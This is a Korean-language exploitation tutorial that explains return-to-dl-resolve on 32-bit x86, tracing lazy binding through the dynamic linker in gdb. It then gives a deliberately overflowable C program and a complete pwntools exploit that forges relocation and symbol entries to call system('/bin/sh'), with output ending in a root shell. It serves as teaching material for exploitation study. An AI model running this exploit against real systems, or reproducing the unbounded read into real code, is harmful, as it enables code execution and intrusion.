---
title: Return-to-dl-resolve - x86
author: Beomsu Lee
category: [Exploitation, Stack]
tags: [exploitation, stack, return-to-dl-resolve]
math: true
mermaid: true
---

## Description

프로그램에서 동적 라이브러리 함수의 주소를 찾기 위해 lazy binding을 사용하고 DYNAMIC 섹션에 write 권한이 있을 때 사용가능한 기법이다. ASLR과 DEP를 우회할 수 있다.

### Dynamic Linker

dynamic linking 방식을 지원하는 프로그램을 실행하면 공유 라이브러리들과 함께 dynamic linker가 메모리에 적재되며 공유라이브러리와 해당 프로그램의 주소공간을 매핑시킬 수 있는 start-up 코드를 가지고 있다.

```c
// gcc hello.c -m32 -o hello
// Test Code
#include <stdio.h>
int main()
{
puts("hello!");
return 0;
}
```

`main()` 함수를 disassemble 하면 문자열 출력을 위해 `puts()` 함수를 호출하기 위해 `puts@plt`를 호출한다.

```
...
0x804841f <main+20>:    push   0x80484c0
=> 0x8048424 <main+25>: call   0x80482e0 <puts@plt>
0x8048429 <main+30>:    add    esp,0x10
...
```

`puts@plt`의 첫 명령은 puts 함수의 GOT를 참조해 점프하는 부분이다. dynamic linker가 한 번도 수행되지 않은 초기에는 got에 plt + 6(0x80482e6) 주소가 있다. 이 부분부터 dynamic linker로 진입하는 부분이며, plt + 6에서는 reloc_offset(0x0)을 push하고 0x80482d0로 분기한다.

```
...
=> 0x80482e0 <puts@plt>:    jmp    DWORD PTR ds:0x804a00c
| 0x80482e6 <puts@plt+6>:   push   0x0
| 0x80482eb <puts@plt+11>:  jmp    0x80482d0
...
gdb-peda$ x/x 0x804a00c
0x804a00c:  0x080482e6
```

공유 라이브러리 정보를 담고 있는 `link_map` 구조체의 주소(0xf7ffd918)를 push하고 0x804a008(got + 8)에 있는 값(`_dl_runtime_resolve`)으로 분기한다.

```
gdb-peda$ elfheader .got.plt
.got.plt: 0x804a000 - 0x804a014 (data)
...
=> 0x80482d0:   push   DWORD PTR ds:0x804a004
0x80482d6:  jmp    DWORD PTR ds:0x804a008
...
gdb-peda$ x/x 0x804a004
0x804a004:  0xf7ffd918  <--- link_map 구조체
```

`_dl_runtime_resolve()` 함수는 push된 두 값(0x0, 0xf7ffd918)을 인자로 `_dl_fixup()` 함수를 호출한다.

```
0xf7fedfe0: push   eax
=> 0xf7fedfe1:  push   ecx
0xf7fedfe2: push   edx
0xf7fedfe3: mov    edx,DWORD PTR [esp+0x10]   <--- 0x0
0xf7fedfe7: mov    eax,DWORD PTR [esp+0xc]    <--- 0xf7ffd918
0xf7fedfeb: call   0xf7fe77e0                 <--- call _dl_fixup()
```

**`Elf32_Rel` 구조체**

```c
typedef uint32_t Elf32_Word;
typedef uint32_t Elf32_Addr;

/* Relocation table entry without addend (in section of type SHT_REL).  */
typedef struct
{
Elf32_Addr        r_offset;                /* Address */
Elf32_Word        r_info;                  /* Relocation type and symbol index */
} Elf32_Rel;
```

`_dl_fixup()`에서 `[ecx+0x4]`에 재배치 테이블의 시작점인 `JMPREL`의 주소를 얻어오는데 이것은 `Elf32_Rel` 형식의 구조체들로 이루어져 있다. 8 byte 구조체 형식인 `Elf32_Rel` 구조체의 처음 4 byte는 got의 주소 다음 4 byte의 첫 번째 1 byte는 재배치 타입, 두 번째부터 네 번째 byte가 `.dynsym` 테이블에서의 인덱스를 나타낸다. `[ecx+0x4]`와 `edx`와 값을 더하고 있는데, `edx`에는 `reloc_offset`이었던 0x0이 들어있다.

```
...
0xf7fe77fa: mov    DWORD PTR [esp+0x8],esi
=> 0xf7fe77fe:  add    edx,DWORD PTR [ecx+0x4] 
0xf7fe7801: mov    eax,DWORD PTR [eax+0x4]
...
gdb-peda$ x/x $ecx+0x4
0x8049f98:  0x08048298  <--- JMPREL
gdb-peda$ x/2wx 0x08048298
0x8048298:  0x0804a00c  0x00000107 
gdb-peda$ 
0x80482a0:  0x0804a010  0x00000307
```

index 0x1, 재배치 타입 0x7.

```
gdb-peda$ x/2wx 0x08048298 + 0x0
0x8048298:  0x0804a00c  0x00000107 
gdb-peda$ x/x 0x0804a00c 
0x804a00c:  0x080482e6
gdb-peda$ x/x 0x080482e6
0x80482e6 <puts@plt+6>: 0x00000068 
```

`_dl_fixup()` 함수에서 `.dynsym` + 0x50에 저장되어있는 `.strtab` 섹션의 주소를 가져오고 `.strtab` 섹션 내 있는 함수명 `puts`의 Offset(0x1a)을 얻어 두 값을 더해 호출할 함수명이 있는 메모리주소를 구하게 된다.

```
...
0xf7fe77fa: mov    DWORD PTR [esp+0x8],esi
0xf7fe77fe: add    edx,DWORD PTR [ecx+0x4]
=> 0xf7fe7801:  mov    eax,DWORD PTR [eax+0x4]    <--- dynsym의 .strtab 섹션 주소
0xf7fe7804: mov    ecx,DWORD PTR [edi+0x38]
0xf7fe7807: mov    DWORD PTR [esp+0xc],eax
...
gdb-peda$ x/24wx $eax+0x4
0x8049f58:  0x0804821c
gdb-peda$ x/8s 0x0804821c
0x804821c:  ""
0x804821d:  "libc.so.6"
0x8048227:  "_IO_stdin_used"
0x8048236:  "puts"
0x804823b:  "__libc_start_main"
0x804824d:  "__gmon_start__"
0x804825c:  "GLIBC_2.0"
0x8048266:  ""
```

index가 `.dynsym` 테이블의 index(0x1)이므로 0x80481dc가 puts의 index이다.

```
gdb-peda$ elfheader .dynsym
.dynsym: 0x80481cc - 0x804821c (rodata)
gdb-peda$ x/24wx 0x80481cc
0x80481cc:  0x00000000  0x00000000  0x00000000  0x00000000
0x80481dc:  0x0000001a  0x00000000  0x00000000  0x00000012 <--- puts
0x80481ec:  0x00000031  0x00000000  0x00000000  0x00000020
0x80481fc:  0x0000001f  0x00000000  0x00000000  0x00000012
0x804820c:  0x0000000b  0x080484bc  0x00000004  0x00100011 
0x804821c:  0x62696c00  0x6f732e63  0x5f00362e  0x735f4f49 <--- .strtab
```

Elf32_Sym 구조체

```c
typedef uint16_t Elf32_Section;
/* Symbol table entry.  */
typedef struct
{
Elf32_Word        st_name;                /* Symbol name (string tbl index) */
Elf32_Addr        st_value;                /* Symbol value */
Elf32_Word        st_size;                /* Symbol size */
unsigned char        st_info;                /* Symbol type and binding */
unsigned char        st_other;                /* Symbol visibility */
Elf32_Section        st_shndx;                /* Section index */
} Elf32_Sym;
```

`.dynsym` 테이블은 `Elf32_Sym`구조체(4 byte 6개)로 이루어져 있는데 중요한 값은 첫 번째와 다섯 번째 값이다. 첫 번째는 함수 이름 위치의 offset이고, 다섯 번째는 3과 &연산을 하여 0이냐 아니냐로 로딩된 함수인지 판단한다. 결과가 0이 아니라면 이미 로딩된 함수라고 판단하고 바로 호출한다.

```
0x0000001a, 0x00000000, 0x00000000, 0x00, 0x00, 0x0012
```

.strtab에 0x1a를 더하면 "puts" 문자열이다.

```
gdb-peda$ x/s 0x80481cc + 0x50 + 0x1a
0x8048236:  "puts"
```

이렇게 알아낸 문자열을 `eax` 레지스터에 넣고 `_dl_lookup_symbol_x()` 함수를 호출한다. 해당 함수가 종료되면 `eax`에 라이브러리의 시작 주소가 쓰여있다.

```
[----------------------------------registers-----------------------------------]
EAX: 0x8048236 ("puts")
[-------------------------------------code-------------------------------------]
0xf7fe7895: mov    edx,edi
0xf7fe7897: push   DWORD PTR [edi+0x1cc]
=> 0xf7fe789d:  call   0xf7fe2a60   <--- _dl_lookup_symbol_x()
0xf7fe78a2: mov    edi,eax
[------------------------------------------------------------------------------]
```

```
...
0xf7fe78af: jne    0xf7fe7918
0xf7fe78b1: mov    ebx,DWORD PTR [esp+0x1c] <--- [esp+0x1c]를 ebx에 넣고
0xf7fe78b5: test   ebx,ebx
0xf7fe78b7: je     0xf7fe79
...
0xf7fe78bd: mov    eax,DWORD PTR [edi] <--- edi(라이브러리 시작 주소)를 eax에 넣고
0xf7fe78bf: movzx  edx,BYTE PTR [ebx+0xc]
0xf7fe78c3: add    eax,DWORD PTR [ebx+0x4] <--- [ebx+0x4](puts offset)와 eax를 더한다.
...
[----------------------------------registers-----------------------------------]
EAX: 0xf7e64140 (<puts>:    push   ebp) <--- eax에 puts의 got 주소
```

`puts()` 함수의 plt에 got가 기록된다.

```
gdb-peda$ x/3i 0x80482e0
0x80482e0 <puts@plt>:   jmp    DWORD PTR ds:0x804a00c
0x80482e6 <puts@plt+6>: push   0x0
0x80482eb <puts@plt+11>:    jmp    0x80482d0
gdb-peda$ x/x 0x804a00c
0x804a00c:  0xf7e64140
```

### Modulate .strtab

`.dynsym`에 쓰기 권한이 있다면 `.dynsym` 영역에 있는 `.strtab` 포인터를 write 권한이 있는 다른 메모리 주소를 가리키도록 하고, 기존의 `.strtab`과 함수명과 offset을 더한 곳에 원하는 함수명을 입력하면 해당 함수가 실행된다. `.bss`영역에 offset(0x1a)를 더한 부분에 `system` 문자열을 입력한다.

```
gdb-peda$ elfheader .bss
.bss: 0x804a01c - 0x804a020 (data)
gdb-peda$ set *(0x804a01c + 0x50 + 0x1a)=0x74737973
gdb-peda$ set *(0x804a01c + 0x50 + 0x1a + 0x4)=0x00006d65
gdb-peda$ x/24wx 0x804a01c
0x804a01c <completed.7209>: 0x00000000  0x00000000  0x00000000  0x00000000
0x804a02c:  0x00000000  0x00000000  0x00000000  0x00000000
0x804a03c:  0x00000000  0x00000000  0x00000000  0x00000000
0x804a04c:  0x00000000  0x00000000  0x00000000  0x00000000
0x804a05c:  0x00000000  0x00000000  0x00000000  0x00000000
0x804a06c:  0x00000000  0x00000000  0x00000000  0x00000000
0x804a07c:  0x00000000  0x00000000  0x79730000  0x6d657473
```

`.dynamic` 영역에 `.strtab`을 가리키는 포인터가 존재하는데 이 부분을 `.bss` 영역으로 덮어쓴다.

```
gdb-peda$ x/24wx 0x8049f14 + 0x44
0x8049f58:  0x0804821c
gdb-peda$ set *(0x8049f14 + 0x44) = 0x804a01c + 0x50
```

system에 breakpoint를 걸고 continue를 하면 system 함수가 호출된다.

```
gdb-peda$ b system
Breakpoint 2 at 0xf7e41940
gdb-peda$ c
Continuing.
...
[-------------------------------------code-------------------------------------]
0xf7e41936: ret    
0xf7e41937: mov    esi,esi
0xf7e41939: lea    edi,[edi+eiz*1+0x0]
=> 0xf7e41940 <system>: sub    esp,0xc
0xf7e41943 <system+3>:  mov    eax,DWORD PTR [esp+0x10]
0xf7e41947 <system+7>:  call   0xf7f2428d
0xf7e4194c <system+12>: add    edx,0x1756b4
0xf7e41952 <system+18>: test   eax,eax
```

## Proof of concept

```c
// Vuln Code
// gcc -fno-stack-protector -o rop rop.c -m32
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
  
void vuln(){
    char buf[50];
    read(0, buf, 512);
}
  
void main(){
    write(1,"Hello ROP\n",10);
    vuln();
}
```

## Exploit code

```python
// Exploit Code
from pwn import *

elf = ELF('./rop')
context.log_level='info'

# get section address
addr_dynsym     = elf.get_section_by_name('.dynsym').header['sh_addr']
addr_dynstr     = elf.get_section_by_name('.dynstr').header['sh_addr']
addr_relplt     = elf.get_section_by_name('.rel.plt').header['sh_addr']
addr_plt        = elf.get_section_by_name('.plt').header['sh_addr']
addr_bss        = elf.get_section_by_name('.bss').header['sh_addr']
addr_plt_read   = elf.plt['read']
addr_got_read   = elf.got['read']

log.info('.dynsym  : ' + hex(addr_dynsym))
log.info('.dynstr  : ' + hex(addr_dynstr))
log.info('.rel.plt : ' + hex(addr_relplt))
log.info('.plt     : ' + hex(addr_plt))
log.info('.bss     : ' + hex(addr_bss))
log.info('read@plt : ' + hex(addr_plt_read))
log.info('read@got : ' + hex(addr_got_read))

addr_pop3 = 0x80484e9
addr_pop_ebp = 0x080484eb
addr_leave_ret = 0x08048458

stack_size = 0x300
base_stage = addr_bss + stack_size

# read(0,base_stage,100)
buf1 = "A"*62
buf1 += p32(addr_plt_read)
buf1 += p32(addr_pop3)
buf1 += p32(0)
buf1 += p32(base_stage)
buf1 += p32(100)
buf1 += p32(addr_pop_ebp)
buf1 += p32(base_stage)
buf1 += p32(addr_leave_ret)

addr_fake_reloc = base_stage + 20
addr_fake_sym = addr_fake_reloc + 8
addr_fake_symstr = addr_fake_sym + 16
addr_fake_cmd = addr_fake_symstr + 7

fake_reloc_offset = addr_fake_reloc - addr_relplt 
fake_r_info = ((addr_fake_sym - addr_dynsym)*16) & ~0xFF  # Fake ELF32_R_SYM
fake_r_info = fake_r_info | 0x7       # Fake ELF32_R_TYPE 
fake_st_name = addr_fake_symstr - addr_dynstr

log.info('fake_reloc_offset : ' + hex(fake_reloc_offset))
log.info('fake_r_info       : ' + hex(fake_r_info))
log.info('fake_st_name      : ' + hex(fake_st_name))

# .bss
# _dl_runtime_resolve(struct link_map *l, fake_reloc_offset)
buf2 = 'AAAA'
buf2 += p32(addr_plt)
buf2 += p32(fake_reloc_offset)
buf2 += 'BBBB'
# Argument of the function
buf2 += p32(addr_fake_cmd)
#Fake Elf32_Rel
buf2 += p32(addr_got_read)
buf2 += p32(fake_r_info)
#Fake Elf32_Sym
buf2 += p32(fake_st_name)
buf2 += p32(0)
buf2 += p32(0)
buf2 += p32(0x12)
#String "system"
buf2 += "system\x00"
#String "/bin/sh"
buf2 += "/bin/sh\x00"

p = process(elf.path)
#gdb.attach(p)
print(p.recvline())

#raw_input('1')
p.send(buf1)
p.send(buf2)
p.interactive()
```

.bss 영역 base_stage에 저장된 값.

```
db-peda$ x/24wx 0x804a020 + 0x300
0x804a320:  0x0000003b  0xf7f5b918  0x00002084 <- fake_reloc_offset  0x42424242
0x804a330:  0x0804a353  0x0804a00c  0x00021707  0x00002120
0x804a340:  0x00000000  0x00000000  0x00000012  0x74737973
```

`fake Elf32_Rel`을 가리키도록 `fake_reloc_offset`을 맞춰준다.

```
gdb-peda$ elfheader .rel.plt
.rel.plt: 0x80482b0 - 0x80482c8 (rodata)
gdb-peda$ x/24wx 0x80482b0 + 0x00002084
0x804a334:  0x0804a00c  0x00021707 <- fake Elf32_Rel  0x00002120    0x00000000
0x804a344:  0x00000000  0x00000012  0x74737973  0x2f006d65
```

`fake_r_info`의 `r_offset`을 더해주면 `Elf32_Sym`을 가리키도록 한다.

```
gdb-peda$ elfheader .dynsym
.dynsym: 0x80481cc - 0x804822c (rodata)
gdb-peda$ x/24wx 0x80481cc + 0x2170
0x804a33c:  0x00002120  0x00000000  0x00000000  0x00000012
0x804a34c:  0x74737973  0x2f006d65  0x2f6e6962  0x00006873
```

`fake_st_name`을 가리키도록 `.dynstr`에서의 offset을 맞춰준다.

```
gdb-peda$ elfheader .dynstr
.dynstr: 0x804822c - 0x804827c (rodata)
gdb-peda$ x/s 0x804822c + 0x00002120
0x804a34c:  "system"
```

```
[----------------------------------registers-----------------------------------]
EAX: 0x3b (';')
EBX: 0x0 
ECX: 0x804a320 --> 0x3b (';')
EDX: 0x64 ('d')
ESI: 0x0 
EDI: 0x804a320 --> 0x3b (';')
EBP: 0x41414141 ('AAAA')
ESP: 0x804a31c --> 0xf7e1b940 (<system>:    sub    esp,0xc)
EIP: 0xf7fc7ffb (ret    0xc)
EFLAGS: 0x212 (carry parity ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
0xf7fc7ff1: mov    ecx,DWORD PTR [esp]
0xf7fc7ff4: mov    DWORD PTR [esp],eax
0xf7fc7ff7: mov    eax,DWORD PTR [esp+0x4]
=> 0xf7fc7ffb:  ret    0xc   <--- 0xc 만큼 인자를 정리해준다.
0xf7fc7ffe: xchg   ax,ax 
0xf7fc8000: push   esp
0xf7fc8001: add    DWORD PTR [esp],0x8
0xf7fc8005: push   ebp
[------------------------------------stack-------------------------------------]
0000| 0x804a31c --> 0xf7e1b940 (<system>:   sub    esp,0xc)
0004| 0x804a320 --> 0x3b (';')
0008| 0x804a324 --> 0xf7fd7918 --> 0x0 
0012| 0x804a328 --> 0x2084 
0016| 0x804a32c ("BBBBS\243\004\b\f\240\004\b\a\027\002")
0020| 0x804a330 --> 0x804a353 ("/bin/sh")
0024| 0x804a334 --> 0x804a00c --> 0xf7e1b940 (<system>: sub    esp,0xc)
0028| 0x804a338 --> 0x21707 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0xf7fc7ffb in ?? () from /lib/ld-linux.so.2
gdb-peda$ x/24wx $esp
0x804a31c:  0xf7e1b940 <- system  0x0000003b    0xf7fd7918  0x00002084
0x804a32c:  0x42424242  0x0804a353 <- &"/bin/sh"  0x0804a00c    0x00021707
0x804a33c:  0x00002120  0x00000000  0x00000000  0x00000012
0x804a34c:  0x74737973  0x2f006d65  0x2f6e6962  0x00006873
0x804a35c:  0x00000000  0x00000000  0x00000000  0x00000000
0x804a36c:  0x00000000  0x00000000  0x00000000  0x00000000
```

## Exploit

```bash
root@bs-virtual-machine:~/pwnable/return-to-resolve# python exploit.py 
[*] '/root/pwnable/return-to-resolve/rop'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] Section Headers
[*] .dynsym  : 0x80481cc
[*] .dynstr  : 0x804822c
[*] .rel.plt : 0x80482b0
[*] .plt     : 0x80482f0
[*] .bss     : 0x804a020
[*] read@plt : 0x8048300
[*] read@got : 0x804a00c
[*] fake_reloc_offset : 0x2084
[*] fake_r_info       : 0x21707
[*] fake_st_name      : 0x2120
[+] Starting local process '/root/pwnable/return-to-resolve/rop': pid 4483
Hello ROP

[*] Switching to interactive mode
$ 
$ id
uid=0(root) gid=0(root) groups=0(root)
$ pwd
/root/pwnable/return-to-resolve
$  
```

## References
- [01.Return-to-dl-resolve - x86](https://www.lazenca.net/display/TEC/01.Return-to-dl-resolve+-+x86)